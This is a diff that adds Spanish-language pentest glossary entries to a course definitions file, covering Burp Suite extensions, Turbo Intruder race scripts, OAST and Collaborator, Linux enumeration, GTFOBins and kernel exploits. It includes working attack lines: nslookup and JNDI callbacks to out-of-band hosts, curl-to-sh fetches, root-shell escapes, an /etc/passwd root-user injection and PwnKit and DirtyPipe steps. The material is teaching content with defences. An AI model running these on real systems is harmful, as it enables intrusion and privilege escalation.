@@ -4216,6 +4216,209 @@ export const DEFINITIONS: ConceptDefinition[] = [
     ],
     related: ["Proxy e intercept", "Escáneres de vulnerabilidades", "OWASP Top 10"],
   },
+  {
+    id: 334,
+    module: 30,
+    term: "Extensiones esenciales del BApp Store",
+    short: "Autorize, JS Miner, Turbo Intruder, HTTP Request Smuggler, InQL, Logger++ — el arsenal que convierte Burp de proxy a plataforma de pentest completa.",
+    detail:
+      "Burp Suite Pro tiene un **BApp Store** con 300+ extensiones. Las esenciales del arsenal moderno:\n" +
+      "\n**Autorize** — el más importante para BOLA/IDOR:\nEnvía cada request de la browsing session con las **cookies de otro user** (config del segundo user). Compara responses y detecta unauthorized access automático. Feature killer para APIs.\n" +
+      "\n**AuthMatrix** — matriz de auth testing:\nDefiní N users y N endpoints; corre tests automatizados de qué user accede a qué endpoint. Ideal para reports formales de authorization coverage.\n" +
+      "\n**JS Miner** — reconnaissance client-side:\nParsea todo el JS de la app en busca de: endpoints ocultos, API keys hardcoded, subdomains referenced, comments con TODO/FIXME, dev artifacts. Encuentra superficie que el crawler oficial no ve.\n" +
+      "\n**HTTP Request Smuggler** (PortSwigger official):\nDe James Kettle. Detección automática de HRS (CL.TE, TE.CL, HTTP/2 downgrade). Ver M24 def #274.\n" +
+      "\n**Turbo Intruder** — Python engine para race conditions:\nReemplaza el Intruder clásico cuando necesitás requests paralelos ultra-rápidos (10K req/sec+). Scripts Python configurables. Ver siguiente def.\n" +
+      "\n**InQL** — GraphQL testing:\nAuto-introspection + Burp integration. Genera queries de todos los types. Ver M22 def #259.\n" +
+      "\n**Logger++** — logging avanzado:\nLog agregado de todo el traffic con filtros complejos. Analytics de requests: qué endpoints se usan más, qué status codes aparecen, tabla ordenable.\n" +
+      "\n**Active Scan++** (portswigger) — extiende el active scanner:\nAgrega checks para SSTI, blind XXE, JWT alg=none, ORM leakage, y ~20 payloads más que el scanner base.\n" +
+      "\n**Param Miner** — ya visto en M24 def #275 para cache poisoning:\nDescubre parámetros ocultos + headers no incluidos en cache key.\n" +
+      "\n**Piper** — pipe requests a herramientas externas:\nPodés mandar cualquier request a `sqlmap`, `ffuf`, `curl`, `nuclei` con un click derecho. Integra Burp con el resto del toolkit CLI.\n" +
+      "\n**Otras útiles:**\n" +
+      "• **Retire.js** — detecta librerías JS con CVEs conocidos\n" +
+      "• **Wappalyzer** — tech stack fingerprinting\n" +
+      "• **Reflected Parameters** — detecta params que se reflejan en response (XSS surface)\n" +
+      "• **Software Version Reporter** — versiones detectadas → CVE lookups\n" +
+      "• **JWT Editor** — decode + edit + sign JWTs desde Repeater\n" +
+      "> 💡 **Autorize** ahorra días de manual testing en APIs modernas. Investment #1 en engagements con APIs.\n" +
+      "> ⚠️ Extensiones community pueden lag entre updates de Burp Pro. Verificar compatibilidad de versión.",
+    examples: [
+      "Autorize en API con 20 endpoints × 3 roles: detecta BOLAs en minutos vs horas manual.",
+      "JS Miner sobre SPA React: descubre `/api/internal/debug` endpoint no linked en UI.",
+      "Turbo Intruder para race condition en cupón de descuento: 100 requests paralelos → precio negativo.",
+    ],
+    related: ["Proxy e intercept", "BOLA / IDOR y Broken Object Level Auth", "GraphQL security", "Turbo Intruder + race conditions"],
+  },
+  {
+    id: 335,
+    module: 30,
+    term: "Turbo Intruder + race conditions",
+    short: "Python-based intruder para requests paralelos ultra-rápidos. Race condition testing, credential stuffing, HTTP smuggling.",
+    detail:
+      "El **Intruder clásico de Burp** manda requests secuenciales — ~40 req/sec en el mejor caso. Para vectores donde el tiempo importa (races, HTTP smuggling PoC), es demasiado lento. **Turbo Intruder** (PortSwigger, James Kettle 2018) fue creado para esto.\n" +
+      "\n**Arquitectura:**\n" +
+      "• **Motor Jython** (Python 2.7 wrapper) para configuración.\n" +
+      "• **HTTP engine custom** que abre múltiples TCP connections + HTTP/2 multiplexing.\n" +
+      "• Hasta **10,000+ req/sec** contra targets locales; **1000+** contra Internet.\n" +
+      "\n**Casos de uso primarios:**\n" +
+      "\n**1. Race conditions:**\n" +
+      "```python\ndef queueRequests(target, wordlists):\n    engine = RequestEngine(endpoint=target.endpoint,\n                           concurrentConnections=100,\n                           requestsPerConnection=100,\n                           pipeline=False)\n    # 30 requests en paralelo con el mismo cupón\n    for i in range(30):\n        engine.queue(target.req)\n\ndef handleResponse(req, interesting):\n    if 'success' in req.response:\n        table.add(req)\n```\nSi el server no tiene locking, el cupón se aplica 30 veces en vez de 1.\n" +
+      "\n**2. Single-packet attack (Kettle 2020):**\n" +
+      "Técnica avanzada: enviar múltiples requests HTTP/2 en un **solo paquete TCP**. Eliminates network jitter — todos los requests llegan al server simultáneamente. Descubre races imposibles con métodos tradicionales.\n" +
+      "```python\nengine = RequestEngine(endpoint=target.endpoint,\n                       concurrentConnections=1,\n                       engine=Engine.BURP2,        # HTTP/2\n                       requestsPerConnection=30)\n# Todos los requests en un solo TCP packet\n```\n" +
+      "\n**3. Credential stuffing y user enum:**\nEspecialmente cuando el server tiene rate limits temporales pero no strict per-user. 500 requests con distintos usernames en 5 segundos → user enum antes de que el rate limit se active.\n" +
+      "\n**4. HTTP Request Smuggling PoC:**\nSmuggling requiere control preciso del byte layout — Turbo Intruder envía la payload raw byte por byte.\n" +
+      "\n**Casos históricos:**\n" +
+      "• **Starbucks 2015** — race en gift cards, exploited con approach similar (pre-Turbo).\n" +
+      "• **Instacart 2020** — refunds reutilizables via race.\n" +
+      "• **Coinbase 2019** — Turbo Intruder race → duplicate withdrawals ($100K bounty).\n" +
+      "• **HackerOne triage 2022+** — race conditions es categoría con findings recurrentes altos.\n" +
+      "\n**PortSwigger Labs con Turbo Intruder:**\n" +
+      "• 'Limit overrun race conditions'\n" +
+      "• 'Bypassing rate limits via race conditions'\n" +
+      "• 'Multi-endpoint race conditions'\n" +
+      "• 'Partial construction race conditions'\n" +
+      "\n**Detección de races (defender):**\n" +
+      "• **Distributed locks** en operaciones críticas (Redis SETNX, Postgres SELECT FOR UPDATE).\n" +
+      "• **Idempotency keys** — cada request con UUID único; el server rechaza duplicados.\n" +
+      "• **Rate limit per-IP + per-user** simultáneo.\n" +
+      "• **Detección post-facto**: alerts si un user aplica el mismo cupón >N veces en <T ventana.\n" +
+      "> 💡 **PortSwigger's 'Attacking secure sites with race conditions' (Kettle, 2023)** es la referencia definitiva de este vector.\n" +
+      "> ⚠️ Turbo Intruder puede **crashear el target** en labs sin protection. Usar con precaución en engagements reales.",
+    examples: [
+      "Coinbase 2019: race en withdraws con Turbo Intruder → $100K bounty.",
+      "PortSwigger Academy: labs de 'Limit overrun race' con Turbo Intruder scripts.",
+      "Kettle Blackhat 2023 talk 'Smashing the state machine' con single-packet attack.",
+    ],
+    related: ["Extensiones esenciales del BApp Store", "Business logic vulnerabilities", "HTTP Request Smuggling (CL.TE, TE.CL, H2.CL)", "BOLA / IDOR y Broken Object Level Auth"],
+  },
+  {
+    id: 336,
+    module: 30,
+    term: "Burp Collaborator y OAST",
+    short: "Servicio externo para detectar vulns 'blind' (SSRF, XXE, deserialization, Log4Shell) sin acceso al server ni Burp Suite Pro on-premise.",
+    detail:
+      "Muchas vulnerabilidades son **blind** — el server ejecuta el payload pero no refleja resultado en la response. Detectarlas requiere que el server **haga una request outbound** a algún servidor que controlemos. Ese servidor es el **OAST** (*Out-of-band Application Security Testing*).\n" +
+      "\n**Burp Collaborator** (PortSwigger, incluido en Burp Pro):\nGenera dominios únicos por scan (`abc123.oastify.com`). Registra DNS lookups, HTTP requests, SMTP, y otros protocolos.\n" +
+      "\n**Flow típico:**\n" +
+      "```\n1. Burp Collaborator genera dominio único: e3nfj29ejd.oastify.com\n2. Enviamos payload al target: ?url=http://e3nfj29ejd.oastify.com/x\n3. Si el server hace SSRF a esa URL, Collaborator registra:\n   - DNS query (el server resolved el hostname)\n   - HTTP GET (el server hizo la request)\n4. 'Poll now' en Collaborator UI → confirma vuln\n```\n" +
+      "\n**Vectores donde OAST es imprescindible:**\n" +
+      "• **Blind SSRF** — server hace request pero no muestra output\n" +
+      "• **Blind XXE con OOB** — parser XML no refleja pero puede resolver entities\n" +
+      "• **Blind SQLi OOB** — `xp_dirtree`, `UTL_HTTP.REQUEST`, `LOAD_FILE` con URL a Collaborator\n" +
+      "• **Blind command injection** — `whoami | nslookup abc.oastify.com`\n" +
+      "• **Blind Java deserialization** — gadget que hace HTTP request\n" +
+      "• **Log4Shell (`${jndi:ldap://collaborator}`)** — el vector canónico\n" +
+      "• **SMTP header injection** — mail bounce a Collaborator\n" +
+      "\n**Alternativas open source:**\n" +
+      "\n**Interactsh** (ProjectDiscovery, gratis, open source):\n" +
+      "```bash\ninteractsh-client\n# Genera dominio único\n# https://c8sjfd.oast.pro/x → poll con -json\n```\nHostado en oast.pro (público) o self-hosted (`interactsh-server`).\n" +
+      "\n**canarytokens.org** (Thinkst):\nPara detección de canarios en producción (no solo pentest). Genera tokens que disparan alerts si son ejecutados: DNS, AWS API key falsa, PDF con webbug.\n" +
+      "\n**xip.io / nip.io** — wildcard DNS pero **NO logging**. Útiles para bypass de local IP validation, no para OAST.\n" +
+      "\n**dnslog.cn** — free service común en pentesting chino. Sin autenticación, con logs.\n" +
+      "\n**Self-hosted OAST:**\nPara engagements con NDA estricto o red teams:\n" +
+      "```bash\n# Interactsh self-hosted\ninteractsh-server -domain miorg.com -ip <public-ip>\n# Requiere DNS record NS delegando *.oast.miorg.com al server\n```\n" +
+      "\n**Correlación con exfil chunked:**\nSi el payload permite exfiltration, encoder chunks del data en el hostname (`<chunk>.oastify.com`) y el Collaborator log te da la data.\n" +
+      "\n**Detección defensive:**\n" +
+      "• **Egress firewall del server** — bloquear DNS/HTTP salientes desde app tier a Internet\n" +
+      "• **DNS logging + alerting** — hostnames raros como `*.oast.pro`, `*.oastify.com`, `*.burpcollaborator.net`\n" +
+      "• **RASP** que detecta calls a hosts no whitelisted\n" +
+      "> 💡 **Collaborator con Burp Pro** cuesta la licencia; **interactsh es gratis** para engagement grande.\n" +
+      "> ⚠️ Los dominios `oastify.com` y `burpcollaborator.net` son **bien conocidos por blue teams**. Self-hosted da mayor stealth.",
+    examples: [
+      "Log4Shell disclosure Dec 2021: `${jndi:ldap://xxx.oastify.com/x}` en User-Agent era la PoC estándar.",
+      "PortSwigger Academy: 'Blind SSRF with out-of-band detection' + 'Blind XXE with OOB'.",
+      "Nuclei templates usan `{{interactsh-url}}` para OAST automatizado.",
+    ],
+    related: ["SSRF y metadata cloud", "XML External Entity (XXE)", "Log4Shell y JNDI injection", "Nuclei y templates modernos"],
+  },
+  {
+    id: 337,
+    module: 30,
+    term: "Match & Replace, Macros y Session Handling Rules",
+    short: "Automation de auth flows, CSRF tokens dinámicos y modificaciones globales de tráfico. Convierte Burp de manual a semi-automated.",
+    detail:
+      "En apps modernas hay 3 obstáculos comunes al pentest automatizado:\n" +
+      "1. **CSRF tokens** que cambian por request.\n" +
+      "2. **Sessions que expiran** durante scans largos.\n" +
+      "3. **Bearer tokens** que rotan con refresh flow.\n" +
+      "\nBurp maneja esto con 3 features combinables:\n" +
+      "\n**1. Match & Replace (Proxy → Options):**\nReemplaza patterns en cada request/response automáticamente. Casos:\n" +
+      "```\n[REQUEST]  User-Agent: Mozilla/... → CustomAgent/1.0\n[REQUEST]  Cookie: session=OLD → session=NEW\n[REQUEST]  Accept-Encoding: gzip → identity      (evita content encoding issues)\n[RESPONSE] header X-Frame-Options: DENY → (delete)     (permite iframe embedding para PoCs)\n[RESPONSE] Content-Security-Policy → (delete)          (elimina CSP para probar XSS)\n[BODY]     ${csrf_token} → ACTUAL_TOKEN\n```\n" +
+      "\n**2. Macros:**\nSecuencia de requests HTTP que Burp ejecuta como precondition antes de un test.\n" +
+      "\nEjemplo canónico — login antes de test:\n" +
+      "```\nMacro:\n  1. POST /login {user, pass}\n  2. GET /csrf-token → extract token from response\n\nSession Handling Rule:\n  Cuando el proxy detecta 'session inválida' (302 redirect a /login):\n  → Correr macro\n  → Update cookie de la nueva session\n  → Retry request original con nueva session + token\n```\n" +
+      "\n**3. Session Handling Rules (SHR):**\nOrquesta cuándo correr macros y qué modificar. Componentes:\n" +
+      "• **Scope** — qué tools (Scanner, Repeater, Intruder) y qué URLs\n" +
+      "• **Rule actions** en orden:\n" +
+      "  - `Run macro` — ejecuta la macro\n" +
+      "  - `Update current request` — inserta/reemplaza parámetros (token, cookie)\n" +
+      "  - `Check session validity` — condición para invocar\n" +
+      "  - `Set specific cookie` — hardcodea\n" +
+      "\n**Ejemplo: automation de CSRF token dinámico:**\n" +
+      "```\nMacro:\n  Request 1: GET /form → extract CSRF token de <input name=\"csrf\" value=\"...\">\n\nSHR:\n  Scope: Scanner, Intruder, Repeater\n  Actions:\n    1. Run macro before every request\n    2. Update current request with 'csrf' parameter from macro response\n  Session validity check: response contains 'invalid CSRF'\n```\nAhora Scanner e Intruder pueden fuzzear el CSRF-protected endpoint sin manualmente actualizar el token.\n" +
+      "\n**Automation de OAuth Bearer:**\n" +
+      "```\nMacro:\n  Request 1: POST /oauth/token {refresh_token} → extract access_token\n\nSHR:\n  Scope: All API endpoints\n  Trigger: response status 401\n  Actions:\n    1. Run macro (refresh)\n    2. Set Authorization: Bearer <new_token> in headers\n```\n" +
+      "\n**Cookie Jar:**\nBurp mantiene un cookie jar global. Con SHR podés especificar qué cookies se pushean a qué requests, evitando fugas de session entre users durante multi-user testing.\n" +
+      "\n**Debugging SHR:**\nProject options → Sessions → **Tracer** — muestra qué SHR se disparó, qué macro corrió, qué se modificó. Imprescindible para tuning.\n" +
+      "\n**Casos avanzados:**\n" +
+      "• **JWT refresh loop** — auto-refresh Bearer expired\n" +
+      "• **Multi-step registration** — signup → verify email → activation → protected endpoints\n" +
+      "• **Anti-automation defense** — timing delays random para evade detection\n" +
+      "• **Header stripping por scope** — quitar Origin/Referer solo en endpoints internos\n" +
+      "> 💡 **Setup inicial** de SHR toma 30 min pero **ahorra horas** en engagements largos con muchos scan runs.\n" +
+      "> ⚠️ SHR mal configurada puede **loop infinito** (macro que hace un request → dispara SHR → macro nuevamente). Usar 'Check session validity' correctamente.",
+    examples: [
+      "Match & Replace del CSP en response para permitir screenshots de XSS PoCs.",
+      "SHR con macro que refresh Bearer OAuth cada 401 en API testing.",
+      "Autorize + SHR combinado: cada request de user A se re-envía con auth de user B automáticamente.",
+    ],
+    related: ["Proxy e intercept", "Extensiones esenciales del BApp Store", "Cross-Site Request Forgery (CSRF)", "OAuth 2.0 flow attacks (redirect_uri, PKCE bypass)"],
+  },
+  {
+    id: 338,
+    module: 30,
+    term: "Repeater workflows profesionales (HTTP/2, copy as curl, comparer)",
+    short: "Repeater no es solo 'resend request'. Con tabs, HTTP/2 view, copy as curl, comparer integration y session save, es el heart del manual testing.",
+    detail:
+      "**Repeater** en Burp es la herramienta más usada del pentest manual. En Burp Pro 2022+ recibió múltiples upgrades que convirtieron manual testing en workflow profesional.\n" +
+      "\n**Basics + workflow tips:**\n" +
+      "\n**Tabs organization:**\n" +
+      "• Ctrl+T abre nueva tab.\n" +
+      "• Nombre descriptivo por double-click.\n" +
+      "• Groups (2023+) — carpetas de tabs por vulnerability class.\n" +
+      "• Comments per-tab con Ctrl+K.\n" +
+      "• Colors por severity/status.\n" +
+      "\n**HTTP/2 tab:**\nAntes solo HTTP/1.1. Ahora podés inspeccionar/editar frames HTTP/2 individuales. Crítico para HRS (HTTP/2 downgrade smuggling) y algunos casos de cache poisoning.\n" +
+      "```\nHTTP/2 pseudo-headers editables:\n:method GET\n:path /admin\n:authority target.com\n:scheme https\n```\n" +
+      "\n**Copy as curl / Python / PowerShell:**\nRight-click en request → `Copy as curl command` (o Python, PowerShell). Ideal para:\n" +
+      "• Reports (curl one-liner por PoC)\n" +
+      "• Testing desde CLI\n" +
+      "• Pasar a colegas sin Burp\n" +
+      "```bash\ncurl -i -s -k -X POST -H 'Cookie: session=xyz' -d 'user=admin' https://target.com/api/action\n```\n" +
+      "\n**Send to Comparer:**\nRight-click en request/response → `Send to Comparer`. Compará dos respuestas byte por byte. Casos:\n" +
+      "• Detectar diferencias sutiles en blind SQLi (boolean-based)\n" +
+      "• Verificar impact de XSS en respuesta\n" +
+      "• Comparar auth vs no-auth\n" +
+      "\n**Send to Intruder / Turbo Intruder:**\nDesde Repeater, ir directo al fuzzing con la request como template.\n" +
+      "\n**Search dentro de request/response:**\nCtrl+F en cada panel. Con regex support. Combinado con **Show extensions** panel muestra decoded values (Base64, URL, JWT payload) inline.\n" +
+      "\n**Highlight:**\nSelect text → Ctrl+H permite highlighting persistente. Útil para: marcar reflection points, XSS payloads, response de auth.\n" +
+      "\n**Match/Replace en Repeater (Burp 2024+):**\nAhora Repeater tiene su propio M&R panel (además del global de Proxy). Testing de headers múltiples sin editar cada vez.\n" +
+      "\n**Save/Load Repeater state:**\n\n**Project files (.burp)** contienen todas las tabs. Podés cerrar Burp con 50 tabs abiertas y retomarlas al siguiente día.\n" +
+      "\n**Export para reports:**\n• Right-click → `Save item` → HTML report per-request.\n• `Save all Repeater tabs` (Burp 2023+) → export batch.\n" +
+      "\n**Content-Type quick edit:**\nCambiar el body encoding (JSON → XML → multipart) con un click en el content-type. Útil para testing de content-type sniffing.\n" +
+      "\n**Response render con browser embebido:**\nBurp incluye Chromium. `Response → Render tab` → muestra la página como el browser real. Detecta DOM XSS/JS bugs sin abrir external.\n" +
+      "\n**Inspector (2020+):**\nPanel lateral que decodifica automáticamente todos los parts de request/response:\n• Cookies con SameSite/HttpOnly/Path\n• Headers con context de riesgo\n• URL parameters\n• Body (form-encoded, JSON, multipart) parseado\n• JWT decodificado\n• Base64 auto-detected\n\nSin necesidad de Decoder tool separada.\n" +
+      "\n**Comments + issues:**\n• `Add issue` desde cualquier request → aparece en el Site Map con severity y descripción custom.\n• Comments per-tab de Repeater ayudan al context switching entre engagements.\n" +
+      "\n**Send to Repeater desde otras tools:**\n• Site Map → right-click → 'Send to Repeater' (batch).\n• Logger++ → right-click → send.\n• Extensions custom → API para agregar tabs.\n" +
+      "> 💡 **Groups + naming + save state** convierten Repeater en tu 'expediente de la vuln' completo — de descubrimiento a report.\n" +
+      "> ⚠️ Cuidado con **share de .burp files** — pueden contener creds y sensitive data. Encriptar antes de mandar.",
+    examples: [
+      "Groups por vuln class: 'IDOR-1', 'SSRF-1', 'SQLi-1'; tabs por sub-caso dentro.",
+      "Copy as curl para hostear PoC en Gist para bug bounty report.",
+      "Comparer entre 200 y 302 responses para blind boolean-based extraction.",
+    ],
+    related: ["Proxy e intercept", "Extensiones esenciales del BApp Store", "Turbo Intruder + race conditions", "Match & Replace, Macros y Session Handling Rules"],
+  },
 
   // ── M31 · Escalada de Privilegios: Linux ─────────────────────────────────
   {
@@ -4279,6 +4482,218 @@ export const DEFINITIONS: ConceptDefinition[] = [
     ],
     related: ["Sudo, cron y PATH hijacking", "Vulnerable and Outdated Components", "Enumeración local (LinPEAS)"],
   },
+  {
+    id: 344,
+    module: 31,
+    term: "LinPEAS, LinEnum y pspy",
+    short: "Automated enumeration para Linux privesc. LinPEAS es el estándar 2024; pspy es único porque monitorea procesos SIN root.",
+    detail:
+      "Después de conseguir shell como user unprivileged en Linux, el primer paso es **enumeration** — mapear qué es explotable. Herramientas modernas:\n" +
+      "\n**LinPEAS (Peass-ng, activo mantenimiento):**\nBash script de 200KB+ que ejecuta ~250 checks. El estándar de facto en OSCP 2024.\n" +
+      "```bash\n# Descarga + ejecución\ncurl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh\n\n# O offline\nwget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh\nchmod +x linpeas.sh\n./linpeas.sh -a          # all checks (2-5 min)\n./linpeas.sh -q          # quiet mode\n./linpeas.sh -o Sfw      # solo checks Files/writable\n```\n" +
+      "\n**Output color-coded (bandera roja/amarilla):**\n" +
+      "```\n🔴 RED    → Vulnerable/Explotable (SUID conocidos, kernel exploits, sudo NOPASSWD)\n🟡 YELLOW → Interesante (writable files, secrets en env)\nBlanco   → Info general\n```\nEl `-a` (all) toma más tiempo pero encuentra edge cases.\n" +
+      "\n**Categorías de checks:**\n" +
+      "• System info (kernel, distro) → linux-exploit-suggester lookup\n" +
+      "• Users/groups + sudo -l\n" +
+      "• Cron jobs (con permissions analysis)\n" +
+      "• SUID/SGID binaries + cross-ref con GTFOBins\n" +
+      "• Capabilities (cap_setuid, cap_dac_read_search)\n" +
+      "• Interesting files (backup, config con creds)\n" +
+      "• Env variables + PATH\n" +
+      "• Services + timers\n" +
+      "• NFS shares con no_root_squash\n" +
+      "• Docker groups + containers\n" +
+      "• Software versions con CVE lookup\n" +
+      "\n**LinEnum** (legacy pero rápido):\n```bash\ncurl -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | sh\n```\nMás simple output, sin color coding. Menos exhaustive pero rápido para initial recon.\n" +
+      "\n**linux-exploit-suggester (Perl):**\nSolo enfocado en kernel exploits. Input: `uname -a` + `/etc/*-release`. Output: lista de CVEs aplicables con exploit links.\n" +
+      "```bash\ncurl -L https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | sh\n```\n" +
+      "\n**pspy — el underrated:**\nMonitorea procesos en tiempo real **SIN necesidad de root** — usa `procfs` polling agresivo + `inotify` sobre `/proc`. Ver cron jobs, scripts que corren como root, y capturar credentials pasadas en argumentos.\n" +
+      "```bash\nwget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64\nchmod +x pspy64\n./pspy64\n```\nOutput muestra cada nuevo proceso con UID, comando, args, PID. **Descubre cron jobs privileged que un enum estático no ve** (ejecutados en frecuencias específicas).\n" +
+      "\n**Uso combinado (workflow OSCP):**\n" +
+      "```\n1. LinPEAS -a    (5 min) → check todo\n2. pspy64        (correr en background 5-10 min) → ver cron jobs\n3. GTFOBins       (buscar cada SUID/sudo binary reportado por LinPEAS)\n4. Manual        (leer config files, backup files reportados)\n```\n" +
+      "\n**Alternativas para minimal environment:**\n" +
+      "• **Bashark** — más liviano que LinPEAS\n" +
+      "• **PrivilegedEsc** (Rebootuser)\n" +
+      "• **BeRoot** (Python)\n" +
+      "\n**Blue team detection:**\n" +
+      "• **osquery** — detectar procesos con nombres tipo `linpeas`, `linenum`, `pspy` (fácil de renombrar)\n" +
+      "• **eBPF probes** — detectar patterns de enumeration (finds masivos, reads de `/proc/*/cmdline`)\n" +
+      "• **Falco** rules for privesc enumeration patterns\n" +
+      "> 💡 En OSCP time-boxed, LinPEAS + pspy en paralelo cubre >90% de casos.\n" +
+      "> ⚠️ LinPEAS dropea artifacts en `/tmp/linpeas.log` por default. En engagement realista, redirigir stdout a memoria o archivo custom.",
+    examples: [
+      "OSCP typical: `curl linpeas | sh` primer 30 segundos post-shell.",
+      "pspy descubre cron root que corre backup.sh en `/home/user/` (writable) → shell PATH hijack.",
+      "PortSwigger: LinPEAS parses `sudo -l` output y highlights NOPASSWD binaries linkeados a GTFOBins.",
+    ],
+    related: ["Enumeración local (LinPEAS)", "GTFOBins y binarios abusables", "Sudo, cron y PATH hijacking", "Bits especiales SUID/SGID/sticky"],
+  },
+  {
+    id: 345,
+    module: 31,
+    term: "GTFOBins y binarios abusables",
+    short: "Catálogo de 300+ binarios Unix legítimos que — via SUID, sudo, o capabilities — permiten escalada a root. Referencia obligada.",
+    detail:
+      "**GTFOBins** (gtfobins.github.io) es el catálogo canónico de binarios Unix **legítimos** que pueden abusarse para: escalar privilegios, escapar shells restringidas, exfiltrar files, leer files privilegiados, etc.\n" +
+      "\nCada binary tiene una página con secciones:\n" +
+      "• **Shell** — si SUID/sudo, obtener shell interactiva\n" +
+      "• **Command** — ejecutar comando específico\n" +
+      "• **File read** — leer archivo protegido\n" +
+      "• **File write** — escribir archivo protegido\n" +
+      "• **Download/Upload** — data exfil\n" +
+      "• **Library load** — inject via LD_PRELOAD-like\n" +
+      "• **Sudo** — con sudo específicamente\n" +
+      "• **Capabilities** — con capabilities específicas\n" +
+      "\n**Ejemplos canónicos:**\n" +
+      "\n**vim / vi con SUID o sudo:**\n" +
+      "```bash\n# En vim\n:!/bin/sh    # → shell heredando UID del binary\n# Si vim es sudo NOPASSWD → root shell\n```\n" +
+      "\n**find:**\n" +
+      "```bash\nfind . -exec /bin/sh \\; -quit\n# Si SUID root → root shell\n```\n" +
+      "\n**less / more / man / view:**\n" +
+      "```bash\n!/bin/sh\n# En el pager, ejecuta comando arbitrario\n```\n" +
+      "\n**tar (SUID o sudo):**\n" +
+      "```bash\ntar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/sh\n```\n" +
+      "\n**awk / gawk:**\n" +
+      "```bash\nawk 'BEGIN {system(\"/bin/sh\")}'\n```\n" +
+      "\n**python / perl / ruby / node (con SUID o sudo):**\n" +
+      "```bash\npython -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'\n```\n" +
+      "\n**cp / mv / dd** — file write:\n" +
+      "```bash\n# Si sudo permite cp\nsudo cp /etc/passwd /tmp/passwd_backup   # LEER passwd\necho 'attacker::0:0:root:/root:/bin/sh' | sudo tee -a /etc/passwd   # ESCRIBIR\n```\n" +
+      "\n**Capabilities específicas:**\n\n**cap_setuid+ep en Python:**\n```bash\ngetcap /usr/bin/python3.11 → cap_setuid+ep\npython3.11 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'\n```\n\n**cap_dac_read_search+ep** — lee cualquier archivo:\n```bash\ngetcap /usr/bin/rvim → cap_dac_read_search+ep\nrvim /etc/shadow    # lee sin ser root\n```\n\n**cap_sys_admin+ep** — el equivalente casi a root:\n```bash\n# Con cap_sys_admin, mount interno posible:\nmount --bind / /tmp/rootfs    # bind mount de todo el filesystem\n```\n\n**LOLBAS — el equivalente Windows:**\nlolbas-project.github.io — 200+ binarios de Windows firmados por Microsoft que pueden abusarse (certutil.exe para download, mshta.exe para script execution, wmic.exe para lateral movement, etc.).\n" +
+      "\n**Cómo usar (workflow post-enum):**\n" +
+      "```\n1. LinPEAS output: \"Sudo NOPASSWD: /usr/bin/vim\"\n2. GTFOBins → search 'vim' → sudo section\n3. Copy payload: sudo vim -c ':!/bin/sh'\n4. Root shell.\n```\n" +
+      "\n**Contramedidas defensivas:**\n" +
+      "• **Auditar** sudo rules regularmente (sudo -l enumeration en cron).\n" +
+      "• **Minimum necessary permission** — nunca dar sudo full path (usar restricted-shell alternatives).\n" +
+      "• **Auditd/eBPF probes** — alert on sudo executions de GTFOBins binaries.\n" +
+      "• **SELinux/AppArmor** — MAC policies que restringen incluso a root en ciertos contextos.\n" +
+      "> 💡 GTFOBins es la primera stop después de LinPEAS. Cualquier SUID/sudo debería checkearse ahí.\n" +
+      "> ⚠️ **Sudo -l muestra rules** de tu user; puede no listar todas las system-wide rules. También revisar `/etc/sudoers` + `/etc/sudoers.d/*` si posible.",
+    examples: [
+      "OSCP AD track: sudo NOPASSWD para /usr/bin/awk → root shell en 30 segundos.",
+      "HTB Weblab: capability cap_setuid+ep en Python → root sin SUID.",
+      "Real engagement: dev con sudo NOPASSWD para /usr/bin/less en scripts → shell escape.",
+    ],
+    related: ["Bits especiales SUID/SGID/sticky", "Sudo, cron y PATH hijacking", "LinPEAS, LinEnum y pspy", "Streams y redirección"],
+  },
+  {
+    id: 346,
+    module: 31,
+    term: "Kernel exploits y container escape",
+    short: "DirtyPipe, PwnKit, DirtyCow, runc/CRI-O escapes. Cuando privesc por config falla, kernel bugs siguen abriendo puertas.",
+    detail:
+      "Los **kernel exploits** son el último recurso cuando privesc por config (SUID, sudo, capabilities) no funciona. También el vector primary en container escapes.\n" +
+      "\n**Los más famosos post-2020:**\n" +
+      "\n**PwnKit (CVE-2021-4034, enero 2022):**\nBug de 12 años en `pkexec` (parte de polkit). Envío de `argv[0]=NULL` + env vars manipulate → escalación local a root **en la mayoría de distros Linux** (Ubuntu, Debian, RHEL, SUSE).\n" +
+      "```bash\n# Detectar\npkexec --version    # < 0.120 = vuln\n\n# Exploit (uno de muchos PoCs)\ngit clone https://github.com/berdav/CVE-2021-4034\ncd CVE-2021-4034; make; ./cve-2021-4034\n```\nUno de los exploits privesc más impactantes de la década — casi todo Linux era vulnerable.\n" +
+      "\n**DirtyPipe (CVE-2022-0847, marzo 2022):**\nBug en `pipe_buffer` del kernel. Permite **overwrite de cualquier archivo read-only**, incluyendo `/etc/passwd`, SUID binaries, contenedor read-only images.\n" +
+      "```bash\n# Compilar exploit\ngcc -o dirtypipe dirtypipe.c\n./dirtypipe /usr/bin/sudo    # inyecta shellcode en sudo\n# Correr sudo → root shell\n```\nAfecta **kernel 5.8+ hasta 5.10.102 / 5.15.25 / 5.16.11**.\n" +
+      "\n**DirtyCow (CVE-2016-5195):**\nClásico. Race condition en `mem` device permite escritura de memoria protegida. Todavía impacta kernels legacy (< 4.8.3).\n" +
+      "\n**OverlayFS (CVE-2023-0386, mayo 2023):**\nBug en OverlayFS permite copy_up de archivos SUID entre namespaces → shell root.\n" +
+      "\n**GameOver(lay) (CVE-2023-2640, CVE-2023-32629):**\nUbuntu-specific. Bug en OverlayFS kernel patches propios de Ubuntu → local privesc.\n" +
+      "\n**Looney Tunables (CVE-2023-4911, octubre 2023):**\nBug en glibc dynamic loader (GLIBC_TUNABLES). Impacta Fedora, Ubuntu, Debian, RHEL. LPE.\n" +
+      "\n**Container escapes:**\n\n**CVE-2019-5736 (runc):**\nEl clásico. Un container con permiso `docker exec` puede sobrescribir el binary `runc` del host → RCE root en host cuando el próximo `docker exec` corre.\n" +
+      "```bash\n# El container aprovecha /proc/self/exe apuntando al runc del host\n# Overwrites runc con malicious binary\n```\n" +
+      "\n**CVE-2022-0492 (cgroups v1):**\nContainer con capabilities específicas puede montar cgroup → release_agent con RCE root en host.\n" +
